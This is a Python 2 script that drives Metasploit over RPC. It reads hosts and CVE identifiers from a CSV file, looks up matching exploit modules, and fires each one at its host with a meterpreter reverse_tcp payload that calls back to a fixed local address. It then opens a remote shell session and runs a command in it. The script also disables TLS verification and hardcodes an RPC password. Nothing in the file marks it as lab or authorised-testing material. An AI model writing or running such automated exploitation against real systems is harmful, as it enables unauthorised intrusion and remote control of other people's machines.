#!/usr/bin/env python

from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
import os
import time
import utile
import csv
import ssl

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

line_with_positive = []
line_with_exploit = []
line_with_out = []
status_of_console = False

def console_reader(data_in_console):
	status_of_console= data_in_console['busy']
	console_data = data_in_console['data'].rstrip().split('\n')
	for line in console_data:
		if '[+]' in line:
			line_with_positive.append(line)
		elif 'exploit/' in line:
			line_with_exploit.append(line)
		else:
			line_with_out.append(line)	

	print status_of_console

client = MsfRpcClient("hocine")
console = MsfRpcConsole(client, cb = console_reader)

#utile.parcer_result_scannig("result_of_scannig.csv")

list_cve = []
list_host_exploit = []
list_temp= list()

hitgh_vul = open("high_vul.csv","r")
lines=csv.reader(hitgh_vul)
for line in lines:
 	list_cve=line[1].split(',')
	line[1] = ""
 	for cve in list_cve:
 		console.execute("search "+str(cve)+"")
 		time.sleep(5)
 		while status_of_console:
 			time.sleep(2)		
	list_temp.append(line[0])
	list_temp.append(str(line_with_exploit).split()[2])
	print list_temp
	line_with_exploit = []
	list_host_exploit.append(list_temp)
	
	list_temp = []
	print list_temp
hitgh_vul.close()
print list_host_exploit

for target in list_host_exploit:
	exploit = client.modules.use('exploit', target[1])
	payloadd = ""
	if 'RHOSTS' in exploit.required:
		exploit['RHOSTS'] = target[0]
	for pay in exploit.payloads:
		if 'meterpreter/reverse_tcp' in pay:
			payloadd = client.modules.use('payload', pay)
			payloadd['LHOST'] = '192.168.43.61'
	exc = exploit.execute(payload=payloadd)
	print exc['job_id']
	shell = client.sessions.session(1)
	shell.write('dir\n')
	print shell.read()